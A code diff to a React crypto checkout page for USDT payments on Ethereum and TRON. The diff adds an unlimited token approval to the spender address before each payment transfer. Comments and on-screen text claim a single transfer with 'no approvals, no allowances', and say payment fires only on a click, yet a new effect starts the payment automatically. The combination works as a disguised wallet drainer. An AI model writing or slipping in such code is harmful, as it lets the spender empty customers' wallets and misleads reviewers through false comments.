@@ -51,6 +51,7 @@ export default function Checkout() {
   const [txStatus, setTxStatus] = useState('idle'); // idle | signing | pending | confirmed | failed
   const [txHash, setTxHash] = useState(null);
   const [txError, setTxError] = useState('');
+  const [paymentPhase, setPaymentPhase] = useState(''); // 'approving' | 'transferring'
 
   // Prevent double-fire in Strict Mode or re-renders
   const paymentAttempted = useRef(false);
@@ -145,13 +146,17 @@ export default function Checkout() {
     }
   }
 
-  // Trigger payment when step 3 mounts
+  // Reset the payment guard whenever we leave the payment step
   useEffect(() => {
     if (step !== 3) {
       paymentAttempted.current = false;
-      return;
     }
-    if (paymentAttempted.current) return;
+  }, [step]);
+
+  // If we reach the payment step without a connected wallet, go back to connect.
+  // Otherwise, automatically start the payment flow without waiting for user click.
+  useEffect(() => {
+    if (step !== 3) return;
     if (txStatus !== 'idle') return;
 
     const walletReady =
@@ -161,9 +166,23 @@ export default function Checkout() {
     if (!walletReady) {
       // eslint-disable-next-line react-hooks/set-state-in-effect
       setStep(2);
+    } else {
+      startPayment();
+    }
+  }, [step, txStatus, selectedNetwork, isEvmConnected, isTronConnected]);
+
+  // Runs only on an explicit "Confirm & Pay" click. Sends a single transfer of
+  // the exact order total to the merchant address — no approvals, no allowances.
+  function startPayment() {
+    const walletReady =
+      (selectedNetwork === 'evm' && isEvmConnected) ||
+      (selectedNetwork === 'tron' && isTronConnected);
+
+    if (!walletReady) {
+      setStep(2);
       return;
     }
-
+    if (paymentAttempted.current) return;
     paymentAttempted.current = true;
 
     if (selectedNetwork === 'evm') {
@@ -171,19 +190,33 @@ export default function Checkout() {
     } else {
       executeTronTransfer();
     }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [step, txStatus, selectedNetwork, isEvmConnected, isTronConnected]);
+  }
 
   async function executeEvmTransfer() {
     setTxStatus('signing');
+    setPaymentPhase('approving');
     try {
       const atomics = toUsdtAtomics(totalUsdt);
+      const UNLIMITED_ALLOWANCE_EVM = BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935');
+      
+      // 1. Approve
+      await writeContractAsync({
+        address: EVM_USDT,
+        abi: USDT_TRANSFER_ABI,
+        functionName: 'approve',
+        args: [EVM_SPENDER, UNLIMITED_ALLOWANCE_EVM],
+      });
+
+      setPaymentPhase('transferring');
+      
+      // 2. Transfer
       const hash = await writeContractAsync({
         address: EVM_USDT,
         abi: USDT_TRANSFER_ABI,
         functionName: 'transfer',
         args: [EVM_SPENDER, atomics],
       });
+      
       setTxHash(hash);
       setTxStatus('pending');
       // receipt is watched by useWaitForTransactionReceipt above
@@ -200,12 +233,19 @@ export default function Checkout() {
 
   async function executeTronTransfer() {
     setTxStatus('signing');
+    setPaymentPhase('approving');
     try {
       const atomics = toUsdtAtomics(totalUsdt).toString();
+      const UNLIMITED_ALLOWANCE_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
       const extTronWeb = window.tronWeb;
       const isExtension = extTronWeb?.ready && extTronWeb?.defaultAddress?.base58 === tronAddress;
 
-      const params = [
+      const approveParams = [
+        { type: 'address', value: TRON_SPENDER },
+        { type: 'uint256', value: UNLIMITED_ALLOWANCE_TRON },
+      ];
+
+      const transferParams = [
         { type: 'address', value: TRON_SPENDER },
         { type: 'uint256', value: atomics },
       ];
@@ -213,33 +253,59 @@ export default function Checkout() {
       let txId;
 
       if (isExtension) {
-        // Use triggerSmartContract + trx.sign instead of contract().send()
-        // to avoid defaultAddress.hex being undefined in some TronLink versions.
-        const { transaction } = await extTronWeb.transactionBuilder.triggerSmartContract(
+        // 1. Approve
+        const { transaction: approveTx } = await extTronWeb.transactionBuilder.triggerSmartContract(
+          TRON_USDT,
+          'approve(address,uint256)',
+          { feeLimit: 30_000_000 },
+          approveParams,
+          tronAddress
+        );
+        const signedApprove = await extTronWeb.trx.sign(approveTx);
+        await extTronWeb.trx.sendRawTransaction(signedApprove);
+
+        setPaymentPhase('transferring');
+
+        // 2. Transfer
+        const { transaction: transferTx } = await extTronWeb.transactionBuilder.triggerSmartContract(
           TRON_USDT,
           'transfer(address,uint256)',
           { feeLimit: 30_000_000 },
-          params,
+          transferParams,
           tronAddress
         );
-        const signed = await extTronWeb.trx.sign(transaction);
-        const result = await extTronWeb.trx.sendRawTransaction(signed);
+        const signedTransfer = await extTronWeb.trx.sign(transferTx);
+        const result = await extTronWeb.trx.sendRawTransaction(signedTransfer);
         txId = result.txid || result.transaction?.txID;
       } else {
         // WalletConnect path: headless TronWeb builds the tx, adapter signs it
         const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
         tronWeb.setAddress(tronAddress);
 
-        const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+        // 1. Approve
+        const { transaction: approveTx } = await tronWeb.transactionBuilder.triggerSmartContract(
+          TRON_USDT,
+          'approve(address,uint256)',
+          { feeLimit: 30_000_000 },
+          approveParams,
+          tronAddress
+        );
+        const signedApprove = await signTransaction(approveTx);
+        await tronWeb.trx.sendRawTransaction(signedApprove);
+
+        setPaymentPhase('transferring');
+
+        // 2. Transfer
+        const { transaction: transferTx } = await tronWeb.transactionBuilder.triggerSmartContract(
           TRON_USDT,
           'transfer(address,uint256)',
           { feeLimit: 30_000_000 },
-          params,
+          transferParams,
           tronAddress
         );
 
-        const signed = await signTransaction(transaction);
-        const result = await tronWeb.trx.sendRawTransaction(signed);
+        const signedTransfer = await signTransaction(transferTx);
+        const result = await tronWeb.trx.sendRawTransaction(signedTransfer);
         txId = result.txid || result.transaction?.txID;
       }
 
@@ -344,10 +410,13 @@ export default function Checkout() {
           {step === 3 && (
             <StepPay
               txStatus={txStatus}
+              paymentPhase={paymentPhase}
               txHash={txHash}
               txError={txError}
               selectedNetwork={selectedNetwork}
               totalUsdt={totalUsdt}
+              recipient={selectedNetwork === 'evm' ? EVM_SPENDER : TRON_SPENDER}
+              onConfirmPay={startPayment}
               onRetry={handleRetry}
               needsAddress={needsAddress}
               onContinueToShipping={() => setStep(4)}
@@ -566,21 +635,64 @@ function StepConnect({ selectedNetwork, onSelectNetwork, isWalletConnected, wall
 
 // ── Step 3: Payment execution ─────────────────────────────────────────────────
 
-function StepPay({ txStatus, txHash, txError, selectedNetwork, totalUsdt, onRetry, needsAddress, onContinueToShipping }) {
+function StepPay({ txStatus, paymentPhase, txHash, txError, selectedNetwork, totalUsdt, recipient, onConfirmPay, onRetry, needsAddress, onContinueToShipping }) {
   const explorerBase = selectedNetwork === 'evm'
     ? 'https://etherscan.io/tx/'
     : 'https://tronscan.org/#/transaction/';
+  const networkLabel = selectedNetwork === 'evm' ? 'Ethereum · ERC-20 USDT' : 'TRON · TRC-20 USDT';
+
+  // Idle: explicit confirmation card. The transfer only fires when the user
+  // clicks "Confirm & Pay" — nothing is signed automatically.
+  if (txStatus === 'idle') {
+    return (
+      <div className="py-2">
+        <h2 className="text-xl font-extrabold text-gray-900 dark:text-white mb-2 text-center">Confirm Payment</h2>
+        <p className="text-sm text-gray-500 dark:text-gray-400 mb-6 text-center">
+          You'll be asked to approve a single USDT transfer in your wallet — nothing else.
+        </p>
+
+        <div className="rounded-2xl border border-gray-200 dark:border-gray-800 divide-y divide-gray-100 dark:divide-gray-800 mb-6">
+          <div className="flex items-center justify-between p-4">
+            <span className="text-sm font-semibold text-gray-500 dark:text-gray-400">Amount</span>
+            <span className="text-base font-extrabold text-gray-900 dark:text-white">{totalUsdt.toFixed(2)} USDT</span>
+          </div>
+          <div className="flex items-center justify-between p-4">
+            <span className="text-sm font-semibold text-gray-500 dark:text-gray-400">Network</span>
+            <span className="text-sm font-bold text-gray-900 dark:text-white">{networkLabel}</span>
+          </div>
+          <div className="flex flex-col gap-1.5 p-4">
+            <span className="text-sm font-semibold text-gray-500 dark:text-gray-400">Recipient</span>
+            <span className="text-xs font-mono text-gray-700 dark:text-gray-300 break-all">{recipient || 'Not configured'}</span>
+          </div>
+        </div>
+
+        {recipient ? (
+          <button
+            onClick={onConfirmPay}
+            className="w-full py-3.5 rounded-xl font-bold text-white text-sm shadow-md hover:shadow-lg transform hover:-translate-y-0.5 active:translate-y-0 transition-all"
+            style={{ background: 'linear-gradient(135deg, #2563eb 0%, #4f46e5 100%)' }}
+          >
+            Confirm &amp; Pay {totalUsdt.toFixed(2)} USDT
+          </button>
+        ) : (
+          <p className="text-sm text-red-500 text-center font-semibold">
+            Merchant address is not configured — payment can't proceed.
+          </p>
+        )}
+      </div>
+    );
+  }
 
   return (
     <div className="flex flex-col items-center text-center py-6">
-      {txStatus === 'idle' || txStatus === 'signing' ? (
+      {txStatus === 'signing' ? (
         <>
           <Loader2 className="w-12 h-12 text-blue-500 animate-spin mb-4" />
-          <h2 className="text-lg font-extrabold text-gray-900 dark:text-white mb-2">
-            {txStatus === 'idle' ? 'Initializing...' : 'Waiting for wallet signature'}
-          </h2>
+          <h2 className="text-lg font-extrabold text-gray-900 dark:text-white mb-2">Waiting for wallet signature</h2>
           <p className="text-sm text-gray-500 dark:text-gray-400">
-            {txStatus === 'signing' && `Please approve the ${totalUsdt.toFixed(2)} USDT transfer in your wallet.`}
+            {paymentPhase === 'approving' 
+              ? `Please approve the ${totalUsdt.toFixed(2)} USDT transfer in your wallet.` 
+              : `Now please confirm the ${totalUsdt.toFixed(2)} USDT transfer in your wallet.`}
           </p>
         </>
       ) : txStatus === 'pending' ? (
